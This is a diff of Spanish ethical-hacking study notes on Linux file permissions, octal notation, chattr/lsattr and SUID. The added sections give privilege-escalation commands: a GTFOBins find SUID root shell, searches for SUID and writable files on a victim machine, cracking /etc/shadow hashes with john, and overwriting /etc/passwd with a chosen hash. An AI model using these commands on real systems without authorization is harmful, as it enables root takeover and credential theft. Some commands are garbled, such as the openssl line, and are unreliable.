@@ -1,10 +1,16 @@
-# 🔐 Lectura de permisos
+---
+description: >-
+  Veremos como leer los permisos de un fichero y como encontrar permisos para
+  realizar la explotación.
+---
+
+# 🔐 Permisos y explotación
 
 ![](https://raw.githubusercontent.com/w0lfst/Apuntes-Hacking-Etico/main/assets/images/permisos.png)
 
-> `X` Fichero: ejecutable | directorio: atravesar (cd)
-
-***
+{% hint style="info" %}
+`X` puede tener dos significados, en caso de que sea una fichero significa que tienes permiso para ejecutarlo y si es un directorio significa que puedes entrar.&#x20;
+{% endhint %}
 
 ## Permisos formato decimal
 
@@ -16,67 +22,100 @@
 * 5 = 1+4
 * 5 = 1+4
 
-La posicion se cuenta desde la derecha:
+La posición se cuenta desde la derecha, cada letra seria tendría los siguientes números:
 
-* x > 1
-* w > 2
-* r > 4
+* x = 1
+* w = 2
+* r  =4
 
-> Todo esta convertido de binario a decimal. Para saber como convertir mira el siguiente punto.
+{% hint style="info" %}
+Todo esta convertido de binario a decimal. Para saber como realizar la conversión mira el siguiente punto.
+{% endhint %}
 
-### Convertir de binario a decimal
+### ¿Cómo convertir de binario a decimal?
 
 | r-x | r-- | -w- |
 | --- | --- | --- |
 | 101 | 100 | 010 |
 | 5   | 4   | 2   |
 
-Contar la posicion desde la derecha 0 1 2
-
-* Solo operamos con las posiciones que tengan un 1.
-* Elevamos 2 a cada posicion:
+* En el primer ejemplo (r-x) tendríamos que contar la posición desde la derecha, seria así:
+  * 0 = x
+  * 1 = -
+  * 2 = r
+* Solo operamos con las posiciones que tengan un 1, es decir, con la posición 0 y 2.
+* A continuación elevamos 2 a cada posición:
   * 2^0 + 2^2 = 1 + 4 = 5
   * 2^2 = 4
   * 2^1 = 2
 
+## Atributos de ficheros.
+
 ***
 
-## Permisos avanzados
+El uso del comando está restringido naturalmente al usuario root y en algunos casos al propietario del fichero.
+
+En el siguiente ejemplo vemos como evitar que el propio usuario borre un fichero:
 
 ```bash
 chattr +i -V fichero.txt
 ```
 
-* `+i` Añadir flag que impide borrar el fichero hasta al usuario **root**.
+* `+i` Añade flag que impide borrar el fichero incluido el usuario **root**.
 * `-V` Muestra todo lo que realiza el comando.
 
-> Ver los permisos especiales `lsattr`
+{% hint style="info" %}
+[Clic aquí para ver el manual de chattr](https://man7.org/linux/man-pages/man1/chattr.1.html)
+{% endhint %}
 
-***
+Si queremos ver los atributos que tiene un fichero utilizamos el siguiente comando:
 
-## Explotación permisos SUID
+```bash
+lsattr fichero.txt
+```
 
-1. Asignar un permiso SUID, por ejemplo, el comando find es 755, con chmod añadimos un 4 al permiso del archivo
+## Permisos SUID
+
+Los permisos SUID son permisos de acceso que pueden asignarse a archivos o directorios. Son utilizados principalmente para permitir a los usuarios del sistema ejecutar binarios con privilegios elevados temporalmente para realizar una tarea específica.
+
+Si un fichero tiene activado el bit **Setuid** se identifica con una `s` de la siguiente forma:
+
+```
+w0lfst@h4cknet:~$ ls -l /usr/bin/passwd
+-rwsr-xr–x 1 root root 27920 ago 15 22:45 /usr/bin/passwd
+```
+
+Esta propiedad es necesaria para que los usuarios normales puedan realizar tareas que requieran privilegios más altos que los que dispone un usuario común.&#x20;
+
+### Ejemplo de explotación
+
+1. Asignamos el permiso setuid, por ejemplo, el comando **find** es 755, con `chmod` añadimos un 4 al permiso del archivo, quedaría así:
 
 ```bash
 chmod 4755 /usr/bin/find
 ```
 
-1. Con el comando `id` podemos ver los permisos SUID que tenemos.
-2. Buscariamos en [GTFOBins](https://gtfobins.github.io/) el permiso que tenemos, en este caso, find.
+Ahora buscaríamos en [GTFOBins](https://gtfobins.github.io/) el comando que tiene ese permiso, en este caso, el comando find.
 
-## Explotacion permisos
+GTFOBins nos dice que ejecutemos el siguiente comando para obtener una sh:
 
-Buscar permisos SUID:
+```bash
+find . -exec /bin/sh -p \; -quit
+```
+
+Así conseguimos acceso root gracias a que el comando find tenia asignado un permiso setuid.
+
+### ¿Cómo lo hacemos si no podemos asignar permisos suid?
+
+Para buscar permisos suid en la maquina victima utilizaremos la herramienta find de la siguiente manera:&#x20;
 
 ```bash
 find \-perm -4000  2>/dev/null 
 ```
 
-Para evitar que salgan errores en el escaneo:
-
-1. En bash el error se gestiona a trave del numero 2.
-2. Redirigimos el error a /dev/null → 2>/dev/null
+{% hint style="info" %}
+`2>/dev/null` se utiliza para evitar que salgan errores por la terminal, como no tenemos acceso a todos los ficheros de la maquina saldrían muchos avisos de `Permision denied` y de esta forma lo evitamos.
+{% endhint %}
 
 Buscar archivos con permisos de escritura:
 
@@ -84,42 +123,48 @@ Buscar archivos con permisos de escritura:
 find \-writable 2>/dev/null 
 ```
 
-### Ejemplos ataque:
+## Ejemplos ataque:
+
+### Permiso de lectura:
 
 Si tenemos permiso para ver el archivo shadows podremos ver las contraseñas de los usuarios hasheadas en un formato sha-512.
 
-> Comprobamos el tipo de hash con `cat /etc/login.defs | grep "ENCRYPT_METHOD"`
+{% hint style="info" %}
+Podemos ver el tipo de hash que utiliza nuestra distribucin de linux con el siguiente comando: `cat /etc/login.defs | grep "ENCRYPT_METHOD"`
+{% endhint %}
 
-1. Desencriptaremos las contraseñas por fuerza bruta, por ejemplo con el diccionario rockyou.
-2. Exportamos el hash:
+* Desencriptaremos las contraseñas por fuerza bruta, por ejemplo con el diccionario rockyou.
+* Exportamos el hash:
 
 ```bash
 cat /etc/shadow | grep "user" > hash
 ```
 
-1. Crackemos:
+* Crackeamos:
 
 ```bash
 john --wordlist=/usr/share/wordlists/rockyou hash 
 ```
 
-1. Ver contraseña:
+* Vemos la contraseña:
 
 ```bash
 john --show hash
 ```
 
-Si tenemos permiso de escritura en /etc/passwd:
+### Permisos de escritura:
 
-1. Nos creamos una contraseña:
+Si tenemos permisos para escribir en el `/etc/passwd` haremos lo siguiente:
+
+* Nos creamos una contraseña:
 
 ```bash
 openssl nueva-contraseña
 ```
 
 1. Veremos un hash y lo copiamos.
-2. Con hash y hashid podemos saber en que formato esta hecho.
-3. Modificamos el /etc/passwd y ponemos el hash que hemos generado para asi loguearnos como ese usuario con la contraseña creada anteriormente.
+2. Con `hash` y `hashid` podemos saber en que formato esta hecho.
+3. Modificamos el `/etc/passwd` y ponemos el hash que hemos generado para así loguearnos como ese usuario con la contraseña creada anteriormente.
 
 ## Capabilities
 
